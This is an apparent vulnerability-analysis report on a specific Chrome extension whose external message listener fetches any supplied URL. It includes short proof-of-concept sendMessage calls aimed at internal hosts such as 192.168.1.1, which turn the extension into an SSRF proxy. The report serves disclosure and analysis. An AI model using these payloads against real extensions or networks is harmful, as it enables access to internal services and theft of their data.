# CoCo Analysis: ocbmhhefncmjmcecjcpnihpglmfcpioc

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1 (also detected chrome_browsingData_remove_sink but not fully traced by CoCo)

---

## Sink: bg_chrome_runtime_MessageExternal → fetch_resource_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ocbmhhefncmjmcecjcpnihpglmfcpioc/opgen_generated_files/bg.js
Line 970: fetch(request.url, {

**Code:**

```javascript
// Background script - background.js (line 968-978)
chrome.runtime.onMessageExternal.addListener(function (request, sender, sendResponse) {
    console.log(request);
    fetch(request.url, { // ← attacker-controlled URL
        mode: 'no-cors',
    })
    .then(async (response) => await response.json())
    .then(async (json) => {
        await sendResponse(json); // ← response sent back to attacker
        console.log(json);
    });
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** chrome.runtime.onMessageExternal

**Attack:**

```javascript
// From https://web.whatsapp.com/ (allowed by externally_connectable):
chrome.runtime.sendMessage(
    "ocbmhhefncmjmcecjcpnihpglmfcpioc", // Extension ID
    {url: "http://internal-server/admin/api"}, // Attacker-controlled URL
    function(response) {
        console.log("SSRF response:", response);
    }
);

// Alternative attack - access internal network:
chrome.runtime.sendMessage(
    "ocbmhhefncmjmcecjcpnihpglmfcpioc",
    {url: "http://192.168.1.1/admin"},
    function(response) {
        console.log("Internal network response:", response);
    }
);
```

**Impact:** Server-Side Request Forgery (SSRF) - attacker can make the extension perform privileged cross-origin requests to arbitrary URLs including internal network resources, localhost services, and internal APIs that are not accessible from the web context. The extension has host_permissions for "http://*/*" and "https://*/*", allowing requests to any destination.
